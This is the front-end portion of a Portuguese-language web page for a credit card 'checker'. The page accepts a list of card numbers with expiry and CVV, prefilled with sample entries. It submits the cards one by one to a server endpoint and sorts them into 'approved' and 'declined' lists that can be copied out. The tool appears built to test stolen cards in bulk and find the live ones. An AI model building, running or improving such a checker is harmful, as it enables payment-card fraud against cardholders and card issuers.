                <!-- Input Form -->
                <form id="cardForm">
                    <div class="mb-4">
                        <label class="form-label">
                            <i class="bi bi-list-columns-reverse"></i>
                            Lista de Cartões
                        </label>
                        <textarea 
                            class="form-control" 
                            id="cartoes" 
                            rows="8" 
                            placeholder="4984070156944311 | 10 | 2027 | 336"
                        >4984070156944311 | 10 | 2027 | 336
498407015692527 | 10 | 2027 | 718
4984070156929593 | 10 | 2027 | 393
4984070156978293 | 10 | 2027 | 485
4984070156954310 | 10 | 2027 | 386</textarea>
                    </div>

                    <!-- Action Buttons -->
                    <div class="action-buttons">
                        <button type="button" class="btn btn-success" id="exemploBtn">
                            <i class="bi bi-file-earmark-text"></i> Exemplo
                        </button>
                        <button type="button" class="btn btn-info" id="limparBtn">
                            <i class="bi bi-eraser-fill"></i> Limpar
                        </button>
                        <button type="button" class="btn btn-success" id="copiarAprovadas">
                            <i class="bi bi-clipboard2-check"></i> Copiar Aprovadas
                        </button>
                        <button type="button" class="btn btn-info" id="copiarReprovadas">
                            <i class="bi bi-clipboard2-x"></i> Copiar Reprovadas
                        </button>
                    </div>

                    <!-- Debug Switch -->
                    <div class="d-flex align-items-center my-4 p-3" style="background: #1b1f30; border-radius: 20px;">
                        <label class="switch">
                            <input type="checkbox" id="debugMode">
                            <span class="slider"></span>
                        </label>
                        <span style="font-size: 1.2rem; font-weight: 500;">
                            <i class="bi bi-bug-fill me-2" style="color: #7cf9b0;"></i>
                            Modo Debug
                        </span>
                    </div>

                    <!-- Submit Button -->
                    <button type="submit" class="btn btn-primary" id="startBtn">
                        <i class="bi bi-play-circle-fill me-2"></i>
                        Iniciar Validação
                    </button>
                </form>

                <!-- Results Container -->
                <div class="results-container" id="resultsContainer" style="display: none;">
                    <div class="results-box">
                        <h3>
                            <span><i class="bi bi-check-circle-fill" style="color: #27d98c;"></i> Aprovadas (<span id="aprovadasCount">0</span>)</span>
                            <button class="copy-btn" onclick="copiarLista('aprovadas')">
                                <i class="bi bi-clipboard"></i> Copiar
                            </button>
                        </h3>
                        <div id="aprovadasList"></div>
                    </div>

                    <div class="results-box">
                        <h3>
                            <span><i class="bi bi-x-circle-fill" style="color: #ff5f7c;"></i> Reprovadas (<span id="reprovadasCount">0</span>)</span>
                            <button class="copy-btn" onclick="copiarLista('reprovadas')">
                                <i class="bi bi-clipboard"></i> Copiar
                            </button>
                        </h3>
                        <div id="reprovadasList"></div>
                    </div>
                </div>

                <!-- Debug Output -->
                <div class="debug-section" id="debugSection" style="display: none;">
                    <h3><i class="bi bi-bug-fill"></i> Log de Debug</h3>
                    <div class="debug-content" id="debugContent"></div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        // Estado da aplicação
        let aprovadas = [];
        let reprovadas = [];
        let totalCartoes = 0;
        let processados = 0;
        let processando = false;
        let debugLogsCompletos = [];

        // Elementos
        const notificationToast = document.getElementById('notificationToast');
        const notificationMessage = document.getElementById('notificationMessage');

        // Mostrar notificação (ÚNICA COISA QUE APARECE)
        function mostrarNotificacao(mensagem, tipo = 'info') {
            notificationMessage.innerText = mensagem;
            notificationToast.style.display = 'flex';
            
            if (tipo === 'success') {
                notificationToast.style.borderLeftColor = '#27d98c';
                notificationToast.querySelector('i').style.color = '#27d98c';
            } else if (tipo === 'error') {
                notificationToast.style.borderLeftColor = '#ff5f7c';
                notificationToast.querySelector('i').style.color = '#ff5f7c';
            } else {
                notificationToast.style.borderLeftColor = '#5f7cff';
                notificationToast.querySelector('i').style.color = '#5f7cff';
            }
            
            setTimeout(() => {
                notificationToast.style.display = 'none';
            }, 3000);
        }

        // Atualizar interface
        function atualizarUI() {
            document.getElementById('aprovadas').innerText = aprovadas.length;
            document.getElementById('reprovadas').innerText = reprovadas.length;
            document.getElementById('pendentes').innerText = totalCartoes - processados;
            document.getElementById('total').innerText = totalCartoes;
            
            document.getElementById('aprovadasCount').innerText = aprovadas.length;
            document.getElementById('reprovadasCount').innerText = reprovadas.length;

            const percentual = totalCartoes > 0 ? Math.round((processados / totalCartoes) * 100) : 0;
            document.getElementById('progressBar').style.width = percentual + '%';
            document.getElementById('progressPercent').innerText = percentual + '%';

            document.getElementById('aprovadasList').innerHTML = aprovadas.map(card => `
                <div class="result-item approved">
                    <span class="result-badge badge-approved">✓ APROVADO</span>
                    <div class="card-number">${card.cartao}</div>
                    <div class="card-detail">${card.detalhe || card.message}</div>
                </div>
            `).join('');

            document.getElementById('reprovadasList').innerHTML = reprovadas.map(card => `
                <div class="result-item reproved">
                    <span class="result-badge badge-reproved">✗ REPROVADO</span>
                    <div class="card-number">${card.cartao}</div>
                    <div class="card-detail">${card.detalhe || card.message}</div>
                </div>
            `).join('');

            if (aprovadas.length > 0 || reprovadas.length > 0) {
                document.getElementById('resultsContainer').style.display = 'grid';
            }
        }

        // Copiar lista
        window.copiarLista = function(tipo) {
            const lista = tipo === 'aprovadas' ? aprovadas : reprovadas;
            const texto = lista.map(card => card.cartao).join('\n');
            navigator.clipboard.writeText(texto).then(() => {
                mostrarNotificacao(`📋 ${lista.length} cartão(ões) copiado(s)!`, 'success');
            });
        };

        // Processar cartão via AJAX
        async function processarCartaoAjax(cartao, debug) {
            return new Promise((resolve, reject) => {
                $.ajax({
                    url: window.location.href,
                    method: 'POST',
                    data: {
                        ajax: 'true',
                        cartao: cartao,
                        debug: debug ? 'true' : 'false'
                    },
                    success: resolve,
                    error: reject
                });
            });
        }

        // Processar todos
        document.getElementById('cardForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (processando) {
                mostrarNotificacao('Já existe uma validação em andamento!', 'error');
                return;
            }

            const cartoesRaw = document.getElementById('cartoes').value.split('\n').filter(l => l.trim() !== '');
            totalCartoes = cartoesRaw.length;
            
            if (totalCartoes === 0) {
                mostrarNotificacao('Insira pelo menos um cartão!', 'error');
                return;
            }

            // Reset
            aprovadas = [];
            reprovadas = [];
            debugLogsCompletos = [];
            processados = 0;
            processando = true;
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('resultsContainer').style.display = 'none';
            
            const debug = document.getElementById('debugMode').checked;
            if (debug) {
                document.getElementById('debugSection').style.display = 'block';
                document.getElementById('debugContent').innerHTML = '';
            } else {
                document.getElementById('debugSection').style.display = 'none';
            }

            atualizarUI();
            
            // ÚNICA NOTIFICAÇÃO DE INÍCIO
            mostrarNotificacao(`✅ Validação iniciada! ${totalCartoes} cartão(ões) na fila.`, 'info');

            // Processar um por um
            for (let i = 0; i < cartoesRaw.length; i++) {
                const linha = cartoesRaw[i].replace(/\s+/g, ' ').trim();

                try {
                    const resultado = await processarCartaoAjax(linha, debug);
                    
                    if (resultado.success) {
                        aprovadas.push(resultado);
                    } else {
                        reprovadas.push(resultado);
                    }

                    if (debug && resultado.debug) {
                        debugLogsCompletos.push(`[Cartão ${i+1}] ${linha}`);
                        debugLogsCompletos = debugLogsCompletos.concat(resultado.debug);
                        debugLogsCompletos.push('─'.repeat(60));
                        
                        document.getElementById('debugContent').innerHTML = debugLogsCompletos.map(log => 
                            `<div>${String(log).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>`
                        ).join('');
                        
                        document.getElementById('debugContent').scrollTop = document.getElementById('debugContent').scrollHeight;
                    }

                } catch (error) {
                    reprovadas.push({
                        success: false,
                        message: '❌ ERRO',
                        detalhe: 'Falha na requisição',
                        cartao: linha
                    });
                }

                processados++;
                atualizarUI();
            }

            // Finalizar
            processando = false;
            document.getElementById('startBtn').disabled = false;
            
            // NOTIFICAÇÃO DE FIM
            mostrarNotificacao(
                `✅ Concluído! ${aprovadas.length} aprovadas, ${reprovadas.length} reprovadas.`, 
                aprovadas.length > 0 ? 'success' : 'info'
            );
        });

        // Botões
        document.getElementById('exemploBtn').addEventListener('click', function() {
            document.getElementById('cartoes').value = 
                '4984070156944311 | 10 | 2027 | 336\n' +
                '498407015692527 | 10 | 2027 | 718\n' +
                '4984070156929593 | 10 | 2027 | 393\n' +
                '4984070156978293 | 10 | 2027 | 485\n' +
                '4984070156954310 | 10 | 2027 | 386';
            mostrarNotificacao('Exemplo carregado!', 'info');
        });

        document.getElementById('limparBtn').addEventListener('click', function() {
            document.getElementById('cartoes').value = '';
            aprovadas = [];
            reprovadas = [];
            debugLogsCompletos = [];
            processados = 0;
            totalCartoes = 0;
            atualizarUI();
            document.getElementById('resultsContainer').style.display = 'none';
            document.getElementById('debugSection').style.display = 'none';
            mostrarNotificacao('Tudo limpo!', 'info');
        });

        document.getElementById('copiarAprovadas').addEventListener('click', () => copiarLista('aprovadas'));
        document.getElementById('copiarReprovadas').addEventListener('click', () => copiarLista('reprovadas'));

        // Inicializar
        atualizarUI();
    </script>
</body>
</html>